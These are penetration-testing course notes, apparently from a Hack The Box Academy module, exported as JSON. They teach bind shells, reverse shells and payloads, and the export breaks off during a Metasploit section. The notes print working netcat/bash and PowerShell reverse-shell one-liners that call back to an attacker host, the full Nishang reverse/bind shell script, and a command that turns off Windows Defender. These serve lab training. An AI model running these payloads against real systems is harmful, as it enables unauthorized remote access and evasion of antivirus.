network with no restrictions in place.\n\n---\n\n## Practicing with GNU Netcat\n\nFirst, we need to spawn our attack box or Pwnbox and connect to the Academy network environment. Then make sure our target is started. In this scenario, we will be interacting with an Ubuntu Linux system to understand the nature of a bind shell. To do this, we will be using `netcat` (`nc`) on the client and server.\n\nOnce connected to the target box with ssh, start a Netcat listener:\n\n#### No. 1: Server - Target starting Netcat listener\n\nBind Shells\n\n```shell-session\nTarget@server:~$ nc -lvnp 7777\n\nListening on [0.0.0.0] (family 0, port 7777)\n```\n\nIn this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.\n\nBack on the client (attack box), we will use nc to connect to the listener we started on the server.\n\n#### No. 2: Client - Attack box connecting to target\n\nBind Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nv 10.129.41.200 7777\n\nConnection to 10.129.41.200 7777 port [tcp/*] succeeded!\n```\n\nNotice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server, as seen below.\n\n#### No. 3: Server - Target receiving connection from client\n\nBind Shells\n\n```shell-session\nTarget@server:~$ nc -lvnp 7777\n\nListening on [0.0.0.0] (family 0, port 7777)\nConnection from 10.10.14.117 51872 received!    \n```\n\nKnow that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.\n\n#### No. 4: Client - Attack box sending message Hello Academy\n\nBind Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nv 10.129.41.200 7777\n\nConnection to 10.129.41.200 7777 port [tcp/*] succeeded!\nHello Academy  \n```\n\nOnce we type the message and hit enter, we will notice the message is received on the server-side.\n\n#### No. 5: Server - Target receiving Hello Academy message\n\nBind Shells\n\n```shell-session\nVictim@server:~$ nc -lvnp 7777\n\nListening on [0.0.0.0] (family 0, port 7777)\nConnection from 10.10.14.117 51914 received!\nHello Academy  \n```\n\nNote: When on the academy network (10.129.x.x/16) we can work with another academy student to connect to their target box and practice the concepts presented in this module.\n\n---\n\n## Establishing a Basic Bind Shell with Netcat\n\nWe have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.\n\nOn the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.\n\n#### No. 1: Server - Binding a Bash shell to the TCP session\n\nBind Shells\n\n```shell-session\nTarget@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f\n```\n\nThe commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.\n\nBack on the client, use Netcat to connect to the server now that a shell on the server is being served.\n\n#### No. 2: Client - Connecting to bind shell on target\n\nBind Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nv 10.129.41.200 7777\n\nTarget@server:~$  \n```\n\nWe will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.\n\nAs mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.\n\nNow, let's test our understanding of these concepts with some challenge questions.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/06-Reverse Shells",
    "path": "02_CPTS/07-Shells & Payloads/06-Reverse Shells.md",
    "title": "06 Reverse Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection. Reverse Shell Example !Reverse shell setup: Target 10.10.14.20 connects back to ...",
    "category": "02_CPTS",
    "content": "With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.\n\n#### Reverse Shell Example\n\n![Reverse shell setup: Target 10.10.14.20 connects back to pentester's system 10.10.14.15:1337 using netcat command.](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)\n\nWe will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: `Unrestricted File Upload`, `Command Injection`, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.\n\nWe don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.\n\nLet's work hands-on with this to understand these concepts better.\n\n---\n\n## Hands-on With A Simple Reverse Shell in Windows\n\nWith this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin.\n\nWe can start a Netcat listener on our attack box as the target spawns.\n\n#### Server (`attack box`)\n\nReverse Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 443\nListening on 0.0.0.0 443\n```\n\nThis time around with our listener, we are binding it to a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.\n\nOnce the Windows target has spawned, let's connect using RDP.\n\nNetcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.\n\n`What applications and shell languages are hosted on the target?`\n\nThis is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.\n\nOn the Windows target, open a command prompt and copy & paste this command:\n\n#### Client (target)\n\nReverse Shells\n\n```cmd-session\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\n\nNote: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.\n\nPlease take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called `shell code` or our `payload`. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.\n\n`What happened when we hit enter in command prompt?`\n\n#### Client (target)\n\nReverse Shells\n\n```cmd-session\nAt line:1 char:1\n+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n```\n\nThe `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):\n\n#### Disable AV\n\nReverse Shells\n\n```powershell-session\nPS C:\\Users\\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true\n```\n\nOnce AV is disabled, attempt to execute the code again.\n\n#### Server (attack box)\n\nReverse Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.36.68 49674\n\nPS C:\\Users\\htb-student> whoami\nws01\\htb-student\n```\n\nBack on our attack box, we should notice that we successfully established a reverse shell. We can see this by the change in the prompt that starts with `PS` and our ability to interact with the OS and file system. Try running some standard Windows commands to practice a bit.\n\nNow, let's test our knowledge with some challenge questions.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/07-Introduction to Payloads",
    "path": "02_CPTS/07-Shells & Payloads/07-Introduction to Payloads.md",
    "title": "07 Introduction To Payloads",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Have you ever sent an email or text to someone? Most of us probably have. The message we send in an email or text is the packet's payload as it is sent across the vast Internet. In computing, the ...",
    "category": "02_CPTS",
    "content": "\n---\n\n`Have you ever sent an email or text to someone?`\n\nMost of us probably have. The message we send in an email or text is the packet's payload as it is sent across the vast Internet. In computing, the payload is the intended message. In information security, the payload is the command and/or code that exploits the vulnerability in an OS and/or application. The payload is the command and/or code that performs the malicious action from a defensive perspective. As we saw in the reverse shells section, Windows Defender stopped the execution of our PowerShell payload because it was considered malicious code.\n\nKeep in mind that when we deliver and execute payloads, just like any other program, we give the target computer instructions on what it needs to do. The terms \"malware\" and \"malicious code\" romanticize the process and make it more mysterious than it is. Any time we work with payloads, let's challenge ourselves to explore what the code & commands are actually doing. We will start this process by breaking down the one-liners we worked with earlier:\n\n---\n\n## One-Liners Examined\n\n#### Netcat/Bash Reverse Shell One-liner\n\nIntroduction to Payloads\n\n```shell-session\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f\n```\n\nThe commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:\n\n#### Remove /tmp/f\n\nIntroduction to Payloads\n\n```shell-session\nrm -f /tmp/f; \n```\n\nRemoves the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.\n\n#### Make A Named Pipe\n\nIntroduction to Payloads\n\n```shell-session\nmkfifo /tmp/f; \n```\n\nMakes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.\n\n#### Output Redirection\n\nIntroduction to Payloads\n\n```shell-session\ncat /tmp/f | \n```\n\nConcatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).\n\n#### Set Shell Options\n\nIntroduction to Payloads\n\n```shell-session\n/bin/bash -i 2>&1 | \n```\n\nSpecifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).\n\n#### Open a Connection with Netcat\n\nIntroduction to Payloads\n\n```shell-session\nnc 10.10.14.12 7777 > /tmp/f  \n```\n\nUses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed\n\n---\n\n## PowerShell One-liner Explained\n\nThe shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:\n\n#### Powershell One-liner\n\nIntroduction to Payloads\n\n```cmd-session\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\n\nWe will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.\n\n#### Calling PowerShell\n\nIntroduction to Payloads\n\n```cmd-session\npowershell -nop -c \n```\n\nExecutes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.\n\n#### Binding A Socket\n\nIntroduction to Payloads\n\n```cmd-session\n\"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);\n```\n\nSets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.\n\n#### Setting The Command Stream\n\nIntroduction to Payloads\n\n```cmd-session\n$stream = $client.GetStream();\n```\n\nSets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.\n\n#### Empty Byte Stream\n\nIntroduction to Payloads\n\n```cmd-session\n[byte[]]$bytes = 0..65535|%{0}; \n```\n\nCreates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.\n\n#### Stream Parameters\n\nIntroduction to Payloads\n\n```cmd-session\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n```\n\nStarts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.\n\n#### Set The Byte Encoding\n\nIntroduction to Payloads\n\n```cmd-session\n{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);\n```\n\nSets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.\n\n#### Invoke-Expression\n\nIntroduction to Payloads\n\n```cmd-session\n$sendback = (iex $data 2>&1 | Out-String ); \n```\n\nSets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.\n\n#### Show Working Directory\n\nIntroduction to Payloads\n\n```cmd-session\n$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; \n```\n\nSets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.\n\n#### Sets Sendbyte\n\nIntroduction to Payloads\n\n```cmd-session\n$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\n```\n\nSets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.\n\n#### Terminate TCP Connection\n\nIntroduction to Payloads\n\n```cmd-session\n$client.Close()\"\n```\n\nThis is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.\n\nThe one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:\n\nCode: powershell\n\n```powershell\nfunction Invoke-PowerShellTcp \n{ \n<#\n.SYNOPSIS\nNishang script which can be used for Reverse or Bind interactive PowerShell from a target. \n.DESCRIPTION\nThis script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. \nAlso, a standard Netcat can connect to this script Bind to a specific port.\nThe script is derived from Powerfun written by Ben Turner & Dave Hardy\n.PARAMETER IPAddress\nThe IP address to connect to when using the -Reverse switch.\n.PARAMETER Port\nThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.\n.EXAMPLE\nPS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on \nthe given IP and port. \n.EXAMPLE\nPS > Invoke-PowerShellTcp -Bind -Port 4444\nAbove shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. \n.EXAMPLE\nPS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be\nlistening on the given IP and port. \n.LINK\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html\nhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1\nhttps://github.com/samratashok/nishang\n#>      \n    [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param(\n\n        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")]\n        [String]\n        $IPAddress,\n\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")]\n        [Int]\n        $Port,\n\n        [Parameter(ParameterSetName=\"reverse\")]\n        [Switch]\n        $Reverse,\n\n        [Parameter(ParameterSetName=\"bind\")]\n        [Switch]\n        $Bind\n\n    )\n\n    \n    try \n    {\n        #Connect back if the reverse switch is used.\n        if ($Reverse)\n        {\n            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)\n        }\n\n        #Bind to the provided port if Bind switch is used.\n        if ($Bind)\n        {\n            $listener = [System.Net.Sockets.TcpListener]$Port\n            $listener.start()    \n            $client = $listener.AcceptTcpClient()\n        } \n\n        $stream = $client.GetStream()\n        [byte[]]$bytes = 0..65535|%{0}\n\n        #Send back current username and computername\n        $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\")\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        #Show an interactive PowerShell prompt\n        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n        {\n            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding\n            $data = $EncodedText.GetString($bytes,0, $i)\n            try\n            {\n                #Execute the command on the target.\n                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )\n            }\n            catch\n            {\n                Write-Warning \"Something went wrong with execution of command on the target.\" \n                Write-Error $_\n            }\n            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '\n            $x = ($error[0] | Out-String)\n            $error.clear()\n            $sendback2 = $sendback2 + $x\n\n            #Return the results\n            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n            $stream.Write($sendbyte,0,$sendbyte.Length)\n            $stream.Flush()  \n        }\n        $client.Close()\n        if ($listener)\n        {\n            $listener.Stop()\n        }\n    }\n    catch\n    {\n        Write-Warning \"Something went wrong! Check if the server is reachable and you are using the correct port.\" \n        Write-Error $_\n    }\n}\n```\n\n---\n\n## Payloads Take Different Shapes and Forms\n\nUnderstanding what different types of payloads are doing can help us understand why AV is blocking us from execution and give us some idea of what we might need to change in our code to bypass restrictions. This is something we will explore further in this module. For now, understand that the payloads we use to get a shell on a system will largely be determined by what OS, shell interpreter languages, and even programming languages are present on the target.\n\nNot all payloads are one-liners and deployed manually like those we studied in this section. Some are generated using automated attack frameworks and deployed as a pre-packaged/automated attack to obtain a shell. Like in the very powerful `Metasploit-framework`, which we will work with in the next section.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/08-Automating Payloads & Delivery with Metasploit",
    "path": "02_CPTS/07-Shells & Payloads/08-Automating Payloads & Delivery with Metasploit.md",
    "title": "08 Automating Payloads & Delivery With Metasploit",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Metasploit is an automated attack framework developed by Rapid7 that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n[Metasploit](https://www.metasploit.com) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system. It can make exploiting a vulnerable system so easy that some Cybersecurity training vendors limit how many times it can be used on lab exams. Here at Hack The Box, we encourage experimenting with tools in our lab environments until you have a solid foundational understanding. Most organizations will not limit us on which tools we can or cannot use on an engagement. However, they will expect us to know what we are doing. Therefore, it is our responsibility to seek an understanding as we learn. Not understanding the effects of the tools we use can be destructive in a live penetration test or audit. This is one primary reason we should consistently seek a deeper understanding of the tools, techniques, methodologies, and practices we learn.\n\nIn this section, we will interact with the `community edition` of Metasploit on Pwnbox. We will use pre-built `modules` and craft payloads with `MSFVenom`. It is important to note that many established cybersecurity firms utilize the paid edition of Metasploit called `Metasploit Pro` to conduct penetration tests, security audits, and even social engineering campaigns. If you want to explore the differences between the community edition and Metasploit Pro, you can check out this [comparison chart](https://www.rapid7.com/products/metasploit/download/editions/).\n\n---\n\n## Practicing with Metasploit\n\nWe could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.\n\nLet's start working hands-on with Metasploit by launching the Metasploit framework console as root (`sudo msfconsole`)\n\n#### Starting MSF\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo msfconsole \n                                                  \nIIIIII    dTb.dTb        _.---._\n  II     4'  v  'B   .'\"\".'/|\\`.\"\"'.\n  II     6.     .P  :  .' / | \\ `.  :\n  II     'T;. .;P'  '.'  /  |  \\  `.'\n  II      'T; ;P'    `. /   |   \\ .'\nIIIIII     'YvP'       `-.__|__.-'\n\nI love shells --egypt\n\n\n       =[ metasploit v6.0.44-dev                          ]\n+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]\n+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 8 evasion                                       ]\n\nMetasploit tip: Writing a custom module? After editing your \nmodule, why not try the reload command\n\nmsf6 > \n```\n\nWe can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.\n\n- `2131` exploits\n- `592` payloads\n\nThese numbers can change as the maintainers add and remove code or if you import a module for use into Metasploit. Let's get familiar with Metasploit payloads by using a classic `exploit module` that can be used to compromise a Windows system. Remember that Metasploit can be used for more than just exploitation. We can also use different modules to scan & enumerate targets.\n\nIn this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.\n\n#### NMAP Scan\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25\n\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC\nNmap scan report for 10.129.164.25\nHost is up (0.020s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE       VERSION\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\nHost script results:\n|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-09T21:03:31\n|_  start_date: N/A\n```\n\nIn the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit. Let's go with `SMB` (listening on `445`) as the potential attack vector.\n\nOnce we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:\n\n#### Searching Within Metasploit\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\nmsf6 > search smb\n\nMatching Modules\n================\n\n#    Name                                                          Disclosure Date    Rank   Check  Description\n  -       ----                                                     ---------------    ----   -----  ---------- \n 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection\n 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow\n 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference\n 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer\n 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer\n 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration\n 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration\n 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption\n 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null\n 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset\n 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference\n 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference\n 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS\n 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop\n 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration\n 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution\n 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS\n 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow\n 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS\n 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  